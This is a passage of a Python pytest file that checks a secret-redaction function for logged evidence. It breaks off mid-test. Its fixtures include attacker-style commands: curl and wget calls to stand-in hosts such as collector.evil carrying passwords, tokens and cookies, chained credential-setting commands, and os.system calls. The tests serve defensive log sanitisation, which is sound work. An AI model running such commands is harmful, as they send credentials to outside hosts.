    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"//registry.npmjs.org/:{key}={REDACTED_EVIDENCE_VALUE}" in redacted
    assert "collector.evil" in redacted


@pytest.mark.parametrize("key", ["_auth", "_authToken", "_password", "username"])
def test_npm_config_scoped_auth_argument_is_redacted(key: str) -> None:
    text = f"os.system('npm config set //registry.npmjs.org/:{key} hunter2 && curl https://collector.evil')"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"//registry.npmjs.org/:{key} {REDACTED_EVIDENCE_VALUE}" in redacted
    assert "collector.evil" in redacted


@pytest.mark.parametrize(
    ("command", "expected_context"),
    [
        ("poetry config pypi-token.pypi hunter2", "poetry config pypi-token.pypi <redacted>"),
        ("poetry config http-basic.foo user hunter2", "poetry config http-basic.foo user <redacted>"),
        (
            "poetry config --local pypi-token.pypi hunter2",
            "poetry config --local pypi-token.pypi <redacted>",
        ),
        (
            "poetry config --local http-basic.foo user hunter2",
            "poetry config --local http-basic.foo user <redacted>",
        ),
        (
            "poetry config -- http-basic.foo user -hunter2",
            "poetry config -- http-basic.foo user <redacted>",
        ),
        (
            "poetry config --local -- pypi-token.pypi -hunter2",
            "poetry config --local -- pypi-token.pypi <redacted>",
        ),
    ],
)
def test_poetry_config_credential_value_is_redacted(command: str, expected_context: str) -> None:
    text = f"{command} && curl https://collector.evil"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert expected_context in redacted
    assert "collector.evil" in redacted


@pytest.mark.parametrize(
    "source",
    ["env:PASS_VAR", "fd:3", "file:/run/secrets/passphrase", "stdin"],
)
def test_openssl_enc_dynamic_password_source_is_preserved(source: str) -> None:
    text = f"openssl enc -pass {source} -in input.bin"

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    ("command", "expected_context"),
    [
        (
            "az login --service-principal -u app --federated-token hunter2 --tenant tenant",
            "az login --service-principal -u app --federated-token <redacted> --tenant tenant",
        ),
        (
            "az storage blob list --account-name acct --account-key hunter2",
            "az storage blob list --account-name acct --account-key <redacted>",
        ),
    ],
)
def test_azure_cli_credential_options_are_redacted(command: str, expected_context: str) -> None:
    text = f"{command} && curl https://collector.evil"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert expected_context in redacted
    assert "collector.evil" in redacted


def test_azure_storage_command_without_credentials_is_preserved() -> None:
    text = "az storage blob list --account-name acct --container-name public"

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    "text",
    [
        "os.system('npm config set //registry.npmjs.org/:_authTokenHint=public && curl https://collector.evil')",
        "os.system('npm config set //registry.npmjs.org/:_authTokenHint public && curl https://collector.evil')",
    ],
)
def test_npmrc_scoped_auth_assignment_near_match_is_preserved(text: str) -> None:
    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    "text",
    [
        "aws configure set region us-east-1",
        "aws configure get aws_secret_access_key",
    ],
)
def test_non_credential_aws_configure_commands_are_preserved(text: str) -> None:
    assert redact_evidence_string(text, max_chars=1000) == text


def test_known_authorization_scheme_preserves_trailing_command_context() -> None:
    """Known schemes should redact one credential token without consuming the command tail."""
    text = "Authorization: Bearer sk-live-secret curl https://collector.evil.example/upload"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "sk-live-secret" not in redacted
    assert f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}" in redacted
    assert "curl https://collector.evil.example/upload" in redacted


def test_redacted_url_query_assignment_preserves_command_tail() -> None:
    """Assignment cleanup should not consume command context after a redacted URL query."""
    text = 'os.system("curl https://x.example/upload?api_key=hunter2 /bin/sh")'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
    assert '/bin/sh")' in redacted


def test_semicolon_delimited_url_query_redacts_sensitive_values() -> None:
    """Semicolon query separators should not hide a sensitive parameter behind a benign one."""
    text = "https://collector.evil/upload?x=1;api_key=SECRET123&mode=fast"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "SECRET123" not in redacted
    assert f"x=1;api_key={REDACTED_EVIDENCE_VALUE}&mode=fast" in redacted


def test_semicolon_delimited_benign_url_query_is_preserved() -> None:
    """Supporting semicolon separators should not redact benign query values."""
    text = "https://collector.evil/upload?x=1;mode=fast"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert redacted == text


def test_bracketed_sensitive_url_query_key_is_redacted() -> None:
    """Array-style query keys should retain their shape without exposing the credential value."""
    text = "https://collector.evil/upload?api_key%5B%5D=SECRET123&api_key_hint=public"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "SECRET123" not in redacted
    assert "api_key%5B%5D=<redacted>" in redacted
    assert "api_key_hint=public" in redacted


@pytest.mark.parametrize(
    ("query", "safe_key"),
    [
        ("api%255Fkey=KEYSECRET123", "api_key"),
        ("token%253DWHOLESECRET456=1", "token"),
        ("Authorization%253A%2520Bearer%2520AUTHSECRET789=1", "Authorization"),
        ("x%2526api_key%253DNESTEDSECRET012=1", "api_key"),
        ("prefix%253Ftoken%253DNESTEDSECRET345=1", "token"),
        ("data%253D%257B%2522api_key%2522%253A%2522STRUCTUREDSECRET678%2522%257D=1", "credential"),
    ],
)
def test_iteratively_encoded_sensitive_query_keys_are_redacted(query: str, safe_key: str) -> None:
    text = f"https://collector.evil/upload?{query}&mode=fast"

    redacted = redact_evidence_string(text, max_chars=1000)

    for secret in (
        "KEYSECRET123",
        "WHOLESECRET456",
        "AUTHSECRET789",
        "NESTEDSECRET012",
        "NESTEDSECRET345",
        "STRUCTUREDSECRET678",
    ):
        assert secret not in redacted
    assert f"{safe_key}={REDACTED_EVIDENCE_VALUE}" in redacted
    assert "mode=fast" in redacted


def test_iteratively_encoded_benign_query_key_is_preserved() -> None:
    text = "https://collector.evil/upload?api%255Fkey%255Fhint=public"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "public" in redacted
    assert REDACTED_EVIDENCE_VALUE not in redacted


@pytest.mark.parametrize(
    "text",
    [
        "https://collector.evil/upload?next=x%3D1%3Bapi_key%3DSECRET123",
        "https://collector.evil/upload?next=https%3A%2F%2Fuser%3Apass%40nested.evil%2Fpath",
    ],
)
def test_encoded_nested_url_query_secrets_are_redacted(text: str) -> None:
    """Encoded assignments and credential-bearing URLs should not survive inside benign query values."""
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "SECRET123" not in redacted
    assert "user" not in redacted
    assert "pass" not in redacted
    assert f"next={REDACTED_EVIDENCE_VALUE}" in redacted


def test_encoded_nested_url_path_secret_is_redacted() -> None:
    text = "https://collector.evil/upload?next=https%3A%2F%2Fnested.evil%2Fapi_key%3Dhunter2"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"next={REDACTED_EVIDENCE_VALUE}" in redacted


def test_encoded_nested_url_path_near_match_is_preserved() -> None:
    text = "https://collector.evil/upload?next=https%3A%2F%2Fnested.evil%2Fapi_key_hint%3Dpublic"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "public" in redacted
    assert REDACTED_EVIDENCE_VALUE not in redacted


def test_encoded_nested_url_query_value_secret_is_redacted() -> None:
    text = "https://collector.evil/upload?next=https%3A%2F%2Fnested.evil%2F%3Ffoo%3Dapi_key%253Dhunter2"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"next={REDACTED_EVIDENCE_VALUE}" in redacted


@pytest.mark.parametrize("header", ["Authorization", "Proxy-Authorization"])
def test_encoded_nested_url_query_authorization_value_is_redacted(header: str) -> None:
    text = f"https://collector.evil/upload?next=https%3A%2F%2Fnested.evil%2F%3Ffoo%3D{header}%253ABearer%2520hunter2"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"next={REDACTED_EVIDENCE_VALUE}" in redacted


def test_encoded_nested_url_query_value_near_match_is_preserved() -> None:
    text = "https://collector.evil/upload?next=https%3A%2F%2Fnested.evil%2F%3Ffoo%3Dapi_key_hint%253Dpublic"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "public" in redacted
    assert REDACTED_EVIDENCE_VALUE not in redacted


def test_encoded_nested_url_query_authorization_near_match_is_preserved() -> None:
    text = "https://collector.evil/upload?next=https%3A%2F%2Fnested.evil%2F%3Ffoo%3DAuthorizationPolicy%253Apublic"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "public" in redacted
    assert REDACTED_EVIDENCE_VALUE not in redacted


@pytest.mark.parametrize(
    "nested_reference",
    [
        "%2F%2Fnested.evil%2F%3Ffoo%3Dapi_key%253Dhunter2",
        "%2Fredirect%3Ffoo%3Dapi_key%253Dhunter2",
        "%3Ffoo%3Dapi_key%253Dhunter2",
    ],
)
def test_encoded_nested_relative_query_value_secret_is_redacted(nested_reference: str) -> None:
    text = f"https://collector.evil/upload?next={nested_reference}"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"next={REDACTED_EVIDENCE_VALUE}" in redacted


@pytest.mark.parametrize(
    ("nested_reference", "secret"),
    [
        ("%2F%2Falice%3Ahunter2%40nested.evil%2Fpath", "hunter2"),
        ("%2Fapi_key%253Dhunter3", "hunter3"),
    ],
)
def test_encoded_nested_relative_reference_secrets_are_redacted(
    nested_reference: str,
    secret: str,
) -> None:
    text = f"https://collector.evil/upload?next={nested_reference}"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert f"next={REDACTED_EVIDENCE_VALUE}" in redacted


@pytest.mark.parametrize(
    "nested_reference",
    [
        "%2F%2Fnested.evil%2Fpublic",
        "%2Fapi_key_hint%253Dpublic",
    ],
)
def test_encoded_nested_relative_reference_near_matches_are_preserved(nested_reference: str) -> None:
    text = f"https://collector.evil/upload?next={nested_reference}"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "public" in redacted
    assert REDACTED_EVIDENCE_VALUE not in redacted


@pytest.mark.parametrize(
    ("nested_reference", "secret"),
    [
        ("https%3A%2F%2Fnested.evil%2F%23api_key%253Dhunter4", "hunter4"),
        ("%23api_key%253Dhunter5", "hunter5"),
    ],
)
def test_encoded_nested_fragment_secrets_are_redacted(nested_reference: str, secret: str) -> None:
    text = f"https://collector.evil/upload?next={nested_reference}"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert f"next={REDACTED_EVIDENCE_VALUE}" in redacted


def test_encoded_nested_fragment_near_match_is_preserved() -> None:
    text = "https://collector.evil/upload?next=%23api_key_hint%253Dpublic"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "public" in redacted
    assert REDACTED_EVIDENCE_VALUE not in redacted


@pytest.mark.parametrize(
    ("nested_reference", "secret"),
    [
        ("https%3A%2F%2Fnested.evil%3Aapi_key%253Dhunter6%2Fpath", "hunter6"),
        ("https%3A%2F%2F%5Binvalid%2Fapi_key%253Dhunter7", "hunter7"),
    ],
)
def test_encoded_nested_malformed_authority_is_redacted(nested_reference: str, secret: str) -> None:
    text = f"https://collector.evil/upload?next={nested_reference}"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert f"next={REDACTED_EVIDENCE_VALUE}" in redacted


def test_encoded_nested_url_query_bearer_value_is_redacted() -> None:
    text = "https://collector.evil/upload?next=https%3A%2F%2Fnested.evil%2F%3Ffoo%3DBearer%2520hunter2"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"next={REDACTED_EVIDENCE_VALUE}" in redacted


def test_encoded_nested_url_query_bearer_near_match_is_preserved() -> None:
    text = "https://collector.evil/upload?next=https%3A%2F%2Fnested.evil%2F%3Ffoo%3DBearerPolicy%2520public"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "public" in redacted
    assert REDACTED_EVIDENCE_VALUE not in redacted


@pytest.mark.parametrize(
    "text",
    [
        "https://collector.evil/upload?data=%7B%22api_key%22%3A%22SECRET123%22%7D",
        "https://collector.evil/upload?data=%257B%2522password%2522%253A%2522SECRET123%2522%257D",
    ],
)
def test_encoded_structured_query_secrets_are_redacted(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "SECRET123" not in redacted
    assert f"data={REDACTED_EVIDENCE_VALUE}" in redacted


def test_encoded_benign_structured_query_value_is_preserved() -> None:
    text = "https://collector.evil/upload?data=%7B%22api_key_hint%22%3A%22public%22%7D"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "api_key_hint" in redacted
    assert "public" in redacted


def test_deeply_encoded_query_assignment_is_redacted() -> None:
    encoded = "api_key=DEEPSECRET123"
    for _ in range(6):
        encoded = quote(encoded, safe="")
    text = f"https://collector.evil/upload?data={encoded}"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "DEEPSECRET123" not in redacted
    assert f"data={REDACTED_EVIDENCE_VALUE}" in redacted


def test_deeply_encoded_benign_query_value_is_preserved() -> None:
    encoded = "language=en"
    for _ in range(6):
        encoded = quote(encoded, safe="")
    text = f"https://collector.evil/upload?data={encoded}"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "language" in redacted
    assert "en" in redacted
    assert REDACTED_EVIDENCE_VALUE not in redacted


@pytest.mark.parametrize("key", ["api.key", "aws.secret.access.key"])
def test_dotted_sensitive_url_query_keys_are_redacted(key: str) -> None:
    text = f"https://collector.evil/upload?{key}=SECRET123&mode=fast"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "SECRET123" not in redacted
    assert f"{key}={REDACTED_EVIDENCE_VALUE}" in redacted
    assert "mode=fast" in redacted


def test_dotted_benign_url_query_key_is_preserved() -> None:
    text = "https://collector.evil/upload?api.key.hint=public"

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize("key", ["api.key", "aws.secret.access.key"])
def test_dotted_sensitive_assignment_keys_are_redacted(key: str) -> None:
    text = f'{key}=DOTTED_ASSIGNMENT_SECRET os.system("id")'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "DOTTED_ASSIGNMENT_SECRET" not in redacted
    assert f"{key}={REDACTED_EVIDENCE_VALUE}" in redacted
    assert "os.system" in redacted


def test_dotted_benign_assignment_key_is_preserved() -> None:
    text = "api.key.hint=public"

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    ("text", "context"),
    [
        (
            'os.environ.setdefault("API_KEY", "FUNCTION_ARGUMENT_SECRET"); os.system("id")',
            'os.environ.setdefault("API_KEY", "<redacted>")',
        ),
        (
            "config.get('aws.secret.access.key', 'FUNCTION_ARGUMENT_SECRET'); os.system('id')",
            "config.get('aws.secret.access.key', \"<redacted>\")",
        ),
        (
            'os.environ.setdefault("API_KEY", """FUNCTION_ARGUMENT_SECRET"""); os.system("id")',
            'os.environ.setdefault("API_KEY", "<redacted>")',
        ),
        (
            'os.environ.setdefault("API_KEY", "FUNCTION" "_ARGUMENT_SECRET"); os.system("id")',
            'os.environ.setdefault("API_KEY", "<redacted>")',
        ),
        (
            'helper("API_KEY", "public" if enabled else "FUNCTION_ARGUMENT_SECRET", "mode"); os.system("id")',
            'helper("API_KEY", "<redacted>", "mode")',
        ),
    ],
)
def test_sensitive_key_value_function_arguments_are_redacted(text: str, context: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "FUNCTION_ARGUMENT_SECRET" not in redacted
    assert context in redacted
    assert "os.system" in redacted


def test_benign_key_value_function_arguments_are_preserved() -> None:
    text = 'config.get("api_key_hint", "public"); os.system("id")'

    assert redact_evidence_string(text, max_chars=1000) == text


def test_sensitive_function_argument_preserves_command_default() -> None:
    text = 'config.get("api_key", os.system("id"))'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert redacted == text
    assert "os.system" in redacted


def test_sensitive_function_argument_redacts_secrets_inside_command_default() -> None:
    text = 'config.get("api_key", os.system("curl --password hunter2 https://collector.evil/upload"))'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "os.system" in redacted
    assert "curl --password <redacted>" in redacted
    assert "hunter2" not in redacted


@pytest.mark.parametrize(
    "call",
    [
        'config.get(key="api_key", default="hunter2")',
        'parser.add_argument(option_strings=["-k", "--api-key"], default="hunter2")',
    ],
)
def test_keyword_sensitive_function_descriptor_redacts_default(call: str) -> None:
    text = f'{call}; os.system("id")'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert 'default="<redacted>"' in redacted
    assert "os.system" in redacted


def test_keyword_sensitive_function_descriptor_near_matches_are_preserved() -> None:
    text = (
        'config.get(key="api_key_hint", default="public"); '
        'def configure(key="api_key", default="visible"): return default'
    )

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize("key", ["api_key", "--api-key"])
def test_sensitive_argument_declarations_redact_later_default(key: str) -> None:
    text = f'parser.add_argument("{key}", required=False, default="hunter2"); os.system("id")'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert f'parser.add_argument("{key}", required=False, default="<redacted>")' in redacted
    assert "hunter2" not in redacted
    assert "os.system" in redacted


@pytest.mark.parametrize(
    "key",
    ["api_key2", "my_api_key_value", "tokens", "awsSecretAccessKeyValue", "google_access_id", "google-access-id"],
)
def test_suffixed_sensitive_assignment_aliases_are_redacted(key: str) -> None:
    text = f'{key}=hunter2 os.system("id")'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"{key}=<redacted>" in redacted
    assert "os.system" in redacted


@pytest.mark.parametrize(
    "key",
    [
        "api_key_hint",
        "api_key_valueset",
        "tokenizer",
        "password_policy",
        "google_access_identifier",
        "apiKeyHint",
        "accessTokenCount",
        "privateKeyFormat",
        "requestSignatureAlgorithm",
        "sessionTokenCache",
        "mySecretIngredient",
    ],
)
def test_suffixed_sensitive_assignment_near_matches_are_preserved(key: str) -> None:
    text = f'{key}=public os.system("id")'

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    ("text", "secret", "command"),
    [
        (
            "curl --tlspassword hunter2 https://collector.evil.example/upload",
            "hunter2",
            "curl --tlspassword",
        ),
        (
            "curl --proxy-tlspassword=proxy7 https://collector.evil.example/upload",
            "proxy7",
            "curl --proxy-tlspassword=",
        ),
        (
            "curl --proxy-pass proxy8 https://collector.evil.example/upload",
            "proxy8",
            "curl --proxy-pass",
        ),
        (
            "curl --oauth2-bearer oauth9 https://collector.evil.example/upload",
            "oauth9",
            "curl --oauth2-bearer",
        ),
        (
            "wget --ftp-password download7 ftp://collector.evil.example/model",
            "download7",
            "wget --ftp-password",
        ),
        (
            "wget --http-password=download8 https://collector.evil.example/model",
            "download8",
            "wget --http-password=",
        ),
    ],
)
def test_documented_process_password_options_are_redacted(text: str, secret: str, command: str) -> None:
    """Documented curl and wget password aliases should preserve command context but not values."""
    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert command in redacted
    assert "collector.evil.example" in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted


@pytest.mark.parametrize(
    ("text", "secret", "context"),
    [
        (
            "curl --cert client.pem:CERT_PASSWORD https://collector.evil/upload",
            "CERT_PASSWORD",
            "--cert client.pem:<redacted>",
        ),
        (
            'curl -E "client cert.pem:CERT_PASSWORD" https://collector.evil/upload',
            "CERT_PASSWORD",
            '-E "client cert.pem:<redacted>"',
        ),
        (
            "curl -Eclient.pem:ATTACHED_CERT_PASSWORD https://collector.evil/upload",
            "ATTACHED_CERT_PASSWORD",
            "-Eclient.pem:<redacted>",
        ),
        (
            "curl -LEclient.pem:BUNDLED_CERT_PASSWORD https://collector.evil/upload",
            "BUNDLED_CERT_PASSWORD",
            "-LEclient.pem:<redacted>",
        ),
        (
            r"curl \-Eclient.pem:ESCAPED_OPTION_PASSWORD https://collector.evil/upload",
            "ESCAPED_OPTION_PASSWORD",
            r"\-Eclient.pem:<redacted>",
        ),
        (
            "curl --proxy-cert=proxy.pem:PROXY_CERT_PASSWORD https://collector.evil/upload",
            "PROXY_CERT_PASSWORD",
            "--proxy-cert=proxy.pem:<redacted>",
        ),
        (
            r'curl -E "C:\certs\client.pem:CERT_PASSWORD" https://collector.evil/upload',
            "CERT_PASSWORD",
            r'-E "C:<redacted>"',
        ),
        (
            r'curl --cert "client\:special.pem:CERT_PASSWORD" https://collector.evil/upload',
            "CERT_PASSWORD",
            r'--cert "client\:special.pem:<redacted>"',
        ),
        (
            'curl --cert "x:hunter2:more" https://collector.evil/upload',
            "hunter2:more",
            '--cert "x:<redacted>"',
        ),
        (
            "curl --cert client.pem:hunter2:more https://collector.evil/upload",
            "hunter2:more",
            "--cert client.pem:<redacted>",
        ),
        (
            r"curl --cert C:\certs\client.pem:CERT_PASSWORD https://collector.evil/upload",
            "CERT_PASSWORD",
            r"--cert C:<redacted>",
        ),
        (
            r"curl --cert client\:special.pem:CERT_PASSWORD https://collector.evil/upload",
            "CERT_PASSWORD",
            r"--cert client\:<redacted>",
        ),
        (
            "curl --cert 'x:/hunter2' https://collector.evil/upload",
            "hunter2",
            "--cert 'x:<redacted>'",
        ),
        (
            "curl --cert x:/hunter2:more https://collector.evil/upload",
            "hunter2:more",
            "--cert x:<redacted>",
        ),
        (
            r"curl --cert client\:hunter2 https://collector.evil/upload",
            "hunter2",
            r"--cert client\:<redacted>",
        ),
    ],
)
def test_curl_certificate_passwords_are_redacted(text: str, secret: str, context: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert context in redacted
    assert "collector.evil" in redacted


@pytest.mark.parametrize(
    "text",
    [
        "curl --cert client.pem https://collector.evil/upload",
        "curl --cert-type PEM https://collector.evil/upload",
        'curl -E "client cert.pem" https://collector.evil/upload',
    ],
)
def test_curl_certificate_options_without_passwords_are_preserved(text: str) -> None:
    assert redact_evidence_string(text, max_chars=1000) == text


def test_unterminated_quoted_certificate_password_is_redacted() -> None:
    texts = [
        r'curl --cert "cert.pem:hunter2\"',
        'curl --cert "cert.pem:hunter2\\',
    ]

    for text in texts:
        redacted = redact_evidence_string(text, max_chars=1000)

        assert "hunter2" not in redacted
        assert REDACTED_EVIDENCE_VALUE in redacted


@pytest.mark.parametrize(
    "argument",
    ["-Eclient.pem:hunter2", "-sEclient.pem:hunter2", "-4LEclient.pem:hunter2"],
)
def test_curl_attached_argv_certificate_password_is_redacted(argument: str) -> None:
    text = f"subprocess.run(['curl', '{argument}', 'https://collector.evil/upload'])"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"{argument.removesuffix('hunter2')}<redacted>" in redacted
    assert "collector.evil" in redacted


@pytest.mark.parametrize(
    ("option", "value", "secret", "expected"),
    [
        ("--user", "alice:hunter2", "hunter2", "alice:<redacted>"),
        ("-u", "alice:hunter3", "hunter3", "alice:<redacted>"),
        ("--proxy-user", "proxy:hunter4", "hunter4", "proxy:<redacted>"),
        ("--cert", "client.pem:hunter5", "hunter5", "client.pem:<redacted>"),
        ("-E", "client.pem:hunter6", "hunter6", "client.pem:<redacted>"),
    ],
)
def test_curl_separated_argv_credential_password_is_redacted(
    option: str,
    value: str,
    secret: str,
    expected: str,
) -> None:
    text = f"subprocess.run(['curl', '{option}', '{value}', 'https://collector.evil/upload'])"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert expected in redacted
    assert "collector.evil" in redacted


@pytest.mark.parametrize(
    "text",
    [
        "subprocess.run(['tool', '--user', 'alice:public'])",
        "subprocess.run(['curl', '--user-agent', 'alice:public', 'https://collector.evil'])",
        "subprocess.run(['curl', '-e', 'https://public.example', 'https://collector.evil'])",
    ],
)
def test_curl_separated_argv_credential_near_matches_are_preserved(text: str) -> None:
    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    "wrapper",
    [
        "'sudo'",
        "'env'",
        "'timeout', '5'",
        "'stdbuf', '-oL'",
    ],
)
def test_wrapped_curl_argv_credential_password_is_redacted(wrapper: str) -> None:
    text = f"subprocess.run([{wrapper}, 'curl', '--user', 'alice:wrapped-argv-secret'])"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "wrapped-argv-secret" not in redacted
    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted


@pytest.mark.parametrize(
    "command",
    [
        "['curl', '--netrc-file', '-']",
        "['sudo', 'curl', '--netrc-file', '-']",
        "'curl --netrc-file -'",
        "'curl --netrc-file=-'",
    ],
)
def test_subprocess_curl_netrc_stdin_password_is_redacted(command: str) -> None:
    text = f"subprocess.run({command}, input='machine example login alice password netrc-secret')"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "netrc-secret" not in redacted
    assert f"password {REDACTED_EVIDENCE_VALUE}" in redacted


@pytest.mark.parametrize("executable", ["curl.exe", "/usr/bin/curl", r"C:\tools\curl.exe"])
def test_path_qualified_curl_argv_certificate_password_is_redacted(executable: str) -> None:
    text = f"subprocess.run([{executable!r}, '--cert', 'client.pem:hunter9'])"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter9" not in redacted
    assert f"client.pem:{REDACTED_EVIDENCE_VALUE}" in redacted


def test_ambiguous_drive_letter_certificate_argv_is_redacted() -> None:
    text = r"subprocess.run(['curl', '--cert', r'C:\certs\client.pem', 'https://collector.evil'])"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "client.pem" not in redacted
    assert "C:<redacted>" in redacted


@pytest.mark.parametrize(
    ("text", "option", "secret"),
    [
        ("curl --cookie session=COOKIE_SECRET https://collector.evil/upload", "--cookie", "COOKIE_SECRET"),
        ("curl -b session=COOKIE_SECRET https://collector.evil/upload", "-b", "COOKIE_SECRET"),
        ("curl -bsession=hunter2 https://collector.evil/upload", "-b", "hunter2"),
        ('curl -b"session=hunter2" https://collector.evil/upload', "-b", "hunter2"),
        ("subprocess.run(['curl','-bsession=hunter2','https://collector.evil/upload'])", "-b", "hunter2"),
        ("curl -Lbsession=hunter3 https://collector.evil/upload", "-Lb", "hunter3"),
        ("subprocess.run(['curl','-Lbsession=hunter4','https://collector.evil/upload'])", "-Lb", "hunter4"),
        ("subprocess.run(['curl','-Lb','session=hunter5','https://collector.evil/upload'])", "-Lb", "hunter5"),
        (r"os.system(\"curl -b\\\"session=hunter6\\\" https://collector.evil/upload\")", "-b", "hunter6"),
        ("os.system('curl -b <(echo session=hunter8) https://collector.evil/upload')", "-b", "hunter8"),
    ],
)
def test_curl_cookie_options_are_redacted(text: str, option: str, secret: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert option in redacted
    assert "collector.evil" in redacted


def test_curl_cookie_jar_option_is_not_treated_as_cookie_data() -> None:
    text = "curl --cookie-jar cookies.txt https://collector.evil/upload"

    assert redact_evidence_string(text, max_chars=1000) == text


def test_curl_cookie_dynamic_process_substitution_is_preserved() -> None:
    text = "curl -b <(cat /run/cookies) https://collector.evil/upload"

    assert redact_evidence_string(text, max_chars=1000) == text


def test_non_command_process_substitution_option_is_preserved() -> None:
    text = "documentation: --password <(echo public)"

    assert redact_evidence_string(text, max_chars=1000) == text


def test_attached_short_option_is_only_treated_as_cookie_data_for_curl() -> None:
    text = "bash -bc 'echo public'"

    assert redact_evidence_string(text, max_chars=1000) == text


def test_distant_curl_word_does_not_bind_to_later_bash_short_options() -> None:
    text = "documentation: curl may be used before bash -bc 'echo public'"

    assert redact_evidence_string(text, max_chars=1000) == text


def test_attached_cookie_option_after_bash_header_text_is_redacted() -> None:
    text = 'curl -H "X-Shell: bash" -bsession=hunter7 https://collector.evil/upload'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter7" not in redacted
    assert "X-Shell: bash" in redacted


def test_curl_url_value_that_looks_like_short_option_is_preserved() -> None:
    text = "curl https://collector.evil/upload?flag=-bcache"

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    "key",
    [
        "AZURE_STORAGE_KEY",
        "azure-storage-key",
        "azurestoragekey",
        "DBPASSWORD",
        "PGPASSWORD",
        "MYAPPSECRET",
        "databasepassword",
        "githubtoken",
    ],
)
def test_compact_prefixed_sensitive_assignments_are_redacted(key: str) -> None:
    text = f'{key}=compactpass11 os.system("id")'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "compactpass11" not in redacted
    assert f"{key}=<redacted>" in redacted
    assert "os.system" in redacted


def test_compact_prefixed_sensitive_query_key_is_redacted() -> None:
    text = "curl https://collector.evil/upload?githubtoken=compactpass12"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "compactpass12" not in redacted
    assert "githubtoken=<redacted>" in redacted


@pytest.mark.parametrize(
    "text",
    [
        'DBPASSWORDPOLICY=public os.system("id")',
        'detoken=enabled os.system("id")',
        'retoken=enabled os.system("id")',
        'AZURE_STORAGE_KEY_HINT=public os.system("id")',
        "gh auth status",
        "poetry config repositories.foo https://pypi.example/simple",
        "curl https://collector.evil/upload?githubtokenizer=bert-base",
    ],
)
def test_compact_prefixed_sensitive_near_matches_are_preserved(text: str) -> None:
    assert redact_evidence_string(text, max_chars=1000) == text


def test_quoted_cookie_header_redacts_all_cookie_pairs() -> None:
    text = 'curl -H "Cookie: foo=bar; session=COOKIE_SECRET" https://collector.evil/upload'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "foo=bar" not in redacted
    assert "COOKIE_SECRET" not in redacted
    assert f"Cookie: {REDACTED_EVIDENCE_VALUE}" in redacted
    assert "collector.evil" in redacted


def test_cookie_header_near_match_is_preserved() -> None:
    text = 'curl -H "Cookie-Policy: strict; mode=fast" https://collector.evil/upload'

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize("option", ["--json", "--data"])
def test_command_structured_body_redacts_sensitive_values(option: str) -> None:
